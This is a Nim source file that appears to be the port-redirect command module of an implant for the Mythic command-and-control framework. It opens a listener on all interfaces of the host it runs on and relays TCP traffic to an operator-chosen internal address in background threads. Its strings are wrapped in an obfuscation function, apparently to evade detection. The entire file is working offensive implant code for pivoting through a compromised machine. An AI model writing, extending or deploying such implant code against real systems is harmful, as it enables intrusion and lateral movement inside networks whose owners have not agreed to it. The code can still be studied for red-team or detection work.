import std/[json, net, nativesockets, strformat, tables, os]
import ../config
import ../utils/m_responses
import ../utils/strenc

const BUFFER_SIZE = 8192

type
  RedirectConnectionObj = object
    clientSocket: Socket
    remoteSocket: Socket
    active: bool
    forwardThread: Thread[ptr RedirectConnectionObj]
  
  RedirectConnection = ref object
    clientSocket: Socket
    remoteSocket: Socket
    active: bool
    forwardThread: Thread[ptr RedirectConnectionObj]
    sharedPtr: ptr RedirectConnectionObj
  
  RedirectListenerObj = object
    taskId: string
    port: int
    remoteIp: string
    remotePort: int
    active: bool
    listenerSocket: Socket
    connections: seq[RedirectConnection]
    acceptThread: Thread[ptr RedirectListenerObj]
  
  RedirectListener = ref object
    taskId: string
    port: int
    remoteIp: string
    remotePort: int
    active: bool
    listenerSocket: Socket
    connections: seq[RedirectConnection]
    acceptThread: Thread[ptr RedirectListenerObj]
    sharedPtr: ptr RedirectListenerObj

var
  activeRedirectListeners: Table[string, RedirectListener]

proc forwardBidirectional(conn: ptr RedirectConnectionObj) {.thread.} =
  ## Thread that forwards data bidirectionally between client and remote
  var clientBuffer = newSeq[byte](BUFFER_SIZE)
  var remoteBuffer = newSeq[byte](BUFFER_SIZE)
  
  # Set both sockets to non-blocking mode
  conn[].clientSocket.getFd().setBlocking(false)
  conn[].remoteSocket.getFd().setBlocking(false)
  
  while conn[].active:
    var hadActivity = false
    
    # Read from client, write to remote
    try:
      let bytesRead = conn[].clientSocket.recv(addr clientBuffer[0], BUFFER_SIZE)
      if bytesRead > 0:
        hadActivity = true
        var sent = 0
        while sent < bytesRead and conn[].active:
          try:
            let bytesSent = conn[].remoteSocket.send(unsafeAddr clientBuffer[sent], bytesRead - sent)
            if bytesSent > 0:
              sent += bytesSent
            else:
              sleep(1)  # Sleep 1ms to avoid busy-waiting
          except OSError as e:
            when defined(windows):
              const WsaWouldBlock = 10035'i32
              if e.errorCode.int32 == WsaWouldBlock:
                sleep(1)  # Sleep 1ms to avoid busy-waiting
                continue
            else:
              const EwouldBlock = 11'i32
              if e.errorCode.int32 == EwouldBlock:
                sleep(1)  # Sleep 1ms to avoid busy-waiting
                continue
            # Other error - connection dead
            conn[].active = false
            break
      elif bytesRead == 0:
        # Client closed connection
        conn[].active = false
        break
    except:
      # No data available or error
      discard
    
    if not conn[].active:
      break
    
    # Read from remote, write to client
    try:
      let bytesRead = conn[].remoteSocket.recv(addr remoteBuffer[0], BUFFER_SIZE)
      if bytesRead > 0:
        hadActivity = true
        var sent = 0
        while sent < bytesRead and conn[].active:
          try:
            let bytesSent = conn[].clientSocket.send(unsafeAddr remoteBuffer[sent], bytesRead - sent)
            if bytesSent > 0:
              sent += bytesSent
            else:
              sleep(1)  # Sleep 1ms to avoid busy-waiting
          except OSError as e:
            when defined(windows):
              const WsaWouldBlock = 10035'i32
              if e.errorCode.int32 == WsaWouldBlock:
                sleep(1)  # Sleep 1ms to avoid busy-waiting
                continue
            else:
              const EwouldBlock = 11'i32
              if e.errorCode.int32 == EwouldBlock:
                sleep(1)  # Sleep 1ms to avoid busy-waiting
                continue
            # Other error - connection dead
            conn[].active = false
            break
      elif bytesRead == 0:
        # Remote closed connection
        conn[].active = false
        break
    except:
      # No data available or error
      discard
    
    if not hadActivity:
      # No data on either socket, yield CPU
      sleep(1)  # Sleep 1ms to avoid busy-waiting
  
  # Clean up sockets
  try:
    conn[].clientSocket.close()
  except:
    discard
  
  try:
    conn[].remoteSocket.close()
  except:
    discard

proc acceptConnections(listener: ptr RedirectListenerObj) {.thread.} =
  ## Thread that accepts incoming connections and spawns forwarding threads
  # Set listener socket to non-blocking mode for periodic active checks
  listener[].listenerSocket.getFd().setBlocking(false)
  
  while listener[].active:
    try:
      # Try to accept (non-blocking)
      var clientSocket: Socket
      listener[].listenerSocket.accept(clientSocket)
      
      if not listener[].active:
        clientSocket.close()
        break
      
      # Connect to remote endpoint
      var remoteSocket = newSocket()
      try:
        remoteSocket.connect(listener[].remoteIp, Port(listener[].remotePort))
      except OSError as e:
        # Failed to connect to remote
        clientSocket.close()
        continue
      
      # Create connection object
      var conn = RedirectConnection(
        clientSocket: clientSocket,
        remoteSocket: remoteSocket,
        active: true
      )
      
      # Allocate stable pointer for thread
      conn.sharedPtr = cast[ptr RedirectConnectionObj](alloc0(sizeof(RedirectConnectionObj)))
      conn.sharedPtr[].clientSocket = clientSocket
      conn.sharedPtr[].remoteSocket = remoteSocket
      conn.sharedPtr[].active = true
      
      # Start forwarding thread
      createThread(conn.forwardThread, forwardBidirectional, conn.sharedPtr)
      
      # Store connection
      listener[].connections.add(conn)
    except OSError:
      # No pending connections (EWOULDBLOCK/EAGAIN on non-blocking socket)
      # Sleep briefly and check active flag on next iteration
      sleep(100)  # 100ms
    except:
      # Other error
      if listener[].active:
        sleep(100)
      else:
        # Listener is shutting down, exit thread
        break

proc redirect*(taskId: string, params: JsonNode): JsonNode =
  ## Start/stop port redirect (direct TCP forwarding)
  let action = params[obf("action")].getStr("start")
  
  if action == obf("stop"):
    # Stop existing listener - find by port since each command has a different taskId
    let port = params[obf("port")].getInt()
    var foundListener: RedirectListener = nil
    var foundTaskId: string = ""
    
    for tid, listener in activeRedirectListeners:
      if listener.port == port:
        foundListener = listener
        foundTaskId = tid
        break
    
    if foundListener != nil:
      foundListener.active = false
      foundListener.sharedPtr[].active = false
      
      # Close listener socket first - this will cause accept() to fail immediately
      try:
        foundListener.listenerSocket.close()
      except:
        discard
      
      # Give accept thread time to detect failure and exit (checks every ~100ms)
      sleep(250)
      
      # Close all connections
      for conn in foundListener.connections:
        conn.active = false
        conn.sharedPtr[].active = false
        try:
          conn.clientSocket.close()
        except:
          discard
        try:
          conn.remoteSocket.close()
        except:
          discard
        
        # Don't wait for forwarding thread - it will exit when sockets are closed
        # Memory cleanup will happen naturally when thread exits
      
      # Clean up listener memory
      # Note: sharedPtr and thread resources will be cleaned up when threads exit
      activeRedirectListeners.del(foundTaskId)
      
      return mythicSuccess(taskId, obf("Successfully stopped port redirect") & fmt" on port {foundListener.port}")
    else:
      return mythicError(taskId, obf("No active port redirect found on port ") & $port)
  
  # Start new listener
  let port = params[obf("port")].getInt()
  let remoteIp = params[obf("remote_ip")].getStr()
  let remotePort = params[obf("remote_port")].getInt()
  
  # Create listener socket
  var listenerSocket = newSocket()
  listenerSocket.setSockOpt(OptReuseAddr, true)
  listenerSocket.getFd().setBlocking(true)
  
  try:
    listenerSocket.bindAddr(Port(port), obf("0.0.0.0"))
    listenerSocket.listen()
  except OSError as e:
    return mythicError(taskId, obf("Failed to start listener on port ") & $port & ": " & e.msg)
  
  # Create listener object
  var listener = RedirectListener(
    taskId: taskId,
    port: port,
    remoteIp: remoteIp,
    remotePort: remotePort,
    active: true,
    listenerSocket: listenerSocket,
    connections: @[]
  )
  
  # Allocate stable pointer for thread
  listener.sharedPtr = cast[ptr RedirectListenerObj](alloc0(sizeof(RedirectListenerObj)))
  listener.sharedPtr[].taskId = taskId
  listener.sharedPtr[].port = port
  listener.sharedPtr[].remoteIp = remoteIp
  listener.sharedPtr[].remotePort = remotePort
  listener.sharedPtr[].active = true
  listener.sharedPtr[].listenerSocket = listenerSocket
  listener.sharedPtr[].connections = listener.connections
  
  # Start accept thread
  createThread(listener.acceptThread, acceptConnections, listener.sharedPtr)
  
  # Store listener
  activeRedirectListeners[taskId] = listener
  
  # Return completed status - redirect runs entirely in background
  return mythicSuccess(taskId, obf("Listening on 0.0.0.0:") & $port & obf(", forwarding directly to ") & remoteIp & ":" & $remotePort)
